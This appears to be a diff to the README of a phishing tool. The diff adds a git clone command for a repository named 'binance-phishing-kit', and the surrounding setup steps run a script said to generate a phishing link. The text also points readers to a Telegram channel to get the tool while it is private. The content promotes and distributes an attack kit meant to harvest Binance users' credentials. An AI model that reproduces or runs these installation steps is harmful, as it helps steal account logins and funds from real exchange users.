@@ -20,7 +20,7 @@
 
  ⚡ Installation  
    bash
-git clone https://github.com/*****/********.git  
+git clone https://github.com/leulm77/binance-phishing-kit.git
 cd binance-phish (this tool is private in github for short amount of time but you can get it in my telegram)  
 bash run.sh  # Generates phishing link  
 ```  
